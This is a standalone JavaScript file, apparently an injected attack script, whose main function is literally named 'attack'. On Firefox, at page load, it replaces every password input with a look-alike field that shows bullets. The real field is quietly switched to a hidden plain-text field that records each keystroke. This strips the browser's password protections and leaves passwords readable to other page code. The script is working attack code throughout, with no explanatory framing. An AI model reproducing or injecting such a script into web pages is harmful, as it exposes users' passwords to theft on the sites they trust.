if (navigator.userAgent.match(/firefox/i)) {

	const obf_func_attack_942 = async () => {
		const obf_var_password_fields_942 = document.querySelectorAll("input[type=password]");
		const obf_var_allowed_chars_942 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 `-=~!@#$%^&*()_+[]\\;',./{}|:\"<>?";
		for (var i = 0; i < obf_var_password_fields_942.length; i++) {
			const obf_var_password_field_942 = obf_var_password_fields_942[i];
			obf_var_spoofed_field_942 = obf_var_password_field_942.cloneNode(true);
			obf_var_spoofed_field_942.type = "text";
			obf_var_password_field_942.type = "text";
			obf_var_password_field_942.value = "";
			obf_var_spoofed_field_942.addEventListener("keydown", async(EVENT)=>{
				const obf_var_cursor_start_942 = obf_var_spoofed_field_942.selectionStart;
				const obf_var_cursor_end_942 = obf_var_spoofed_field_942.selectionEnd;
				if (!EVENT.ctrlKey && EVENT.keyCode != 16 && EVENT.keyCode != 18 && EVENT.keyCode != 9 && EVENT.keyCode != 37 && EVENT.keyCode != 39) {
					if (EVENT.keyCode == 8) {
						EVENT.preventDefault();
						if (obf_var_cursor_start_942 != obf_var_cursor_end_942) {
							obf_var_spoofed_field_942.value = obf_var_spoofed_field_942.value.substr(0, obf_var_cursor_start_942) + obf_var_spoofed_field_942.value.substr(obf_var_cursor_end_942);
							obf_var_password_field_942.value = obf_var_password_field_942.value.substr(0, obf_var_cursor_start_942) + obf_var_password_field_942.value.substr(obf_var_cursor_end_942);
							obf_var_spoofed_field_942.selectionStart = obf_var_cursor_start_942;
							obf_var_spoofed_field_942.selectionEnd = obf_var_cursor_start_942;
						} else {
							obf_var_spoofed_field_942.value = obf_var_spoofed_field_942.value.substr(0, obf_var_cursor_start_942-1) + obf_var_spoofed_field_942.value.substr(obf_var_cursor_end_942);
							obf_var_password_field_942.value = obf_var_password_field_942.value.substr(0, obf_var_cursor_start_942-1) + obf_var_password_field_942.value.substr(obf_var_cursor_end_942);
							obf_var_spoofed_field_942.selectionStart = obf_var_cursor_start_942 > 0 ? (obf_var_cursor_start_942-1) : 0;
							obf_var_spoofed_field_942.selectionEnd = obf_var_cursor_start_942 > 0 ? (obf_var_cursor_start_942-1) : 0;
						}
					} else if (EVENT.keyCode == 46) {
						EVENT.preventDefault();
						if (obf_var_cursor_start_942 != obf_var_cursor_end_942) {
							obf_var_spoofed_field_942.value = obf_var_spoofed_field_942.value.substr(0, obf_var_cursor_start_942) + obf_var_spoofed_field_942.value.substr(obf_var_cursor_end_942);
							obf_var_password_field_942.value = obf_var_password_field_942.value.substr(0, obf_var_cursor_start_942) + obf_var_password_field_942.value.substr(obf_var_cursor_end_942);
						} else {
							obf_var_spoofed_field_942.value = obf_var_spoofed_field_942.value.substr(0, obf_var_cursor_start_942) + obf_var_spoofed_field_942.value.substr(obf_var_cursor_end_942+1);
							obf_var_password_field_942.value = obf_var_password_field_942.value.substr(0, obf_var_cursor_start_942) + obf_var_password_field_942.value.substr(obf_var_cursor_end_942+1);
						}
						obf_var_spoofed_field_942.selectionStart = obf_var_cursor_start_942;
						obf_var_spoofed_field_942.selectionEnd = obf_var_cursor_start_942;
					} else if (obf_var_allowed_chars_942.indexOf(EVENT.key) != -1) {
						EVENT.preventDefault();
						obf_var_password_field_942.value = obf_var_password_field_942.value.substr(0, obf_var_cursor_start_942) + EVENT.key + obf_var_password_field_942.value.substr(obf_var_cursor_end_942);
						obf_var_spoofed_field_942.value = "•".repeat(obf_var_password_field_942.value.length);
						obf_var_spoofed_field_942.selectionStart = obf_var_cursor_start_942+1;
						obf_var_spoofed_field_942.selectionEnd = obf_var_cursor_start_942+1;
					}
				}
			});
			obf_var_password_field_942.before(obf_var_spoofed_field_942);
			obf_var_password_field_942.style.display = "none";
		}
	}

	try	{
		document.addEventListener("DOMContentLoaded", obf_func_attack_942);
	} catch (obf_var_ignore_942) {
		self.addEventListener("load", obf_func_attack_942);
	}

}
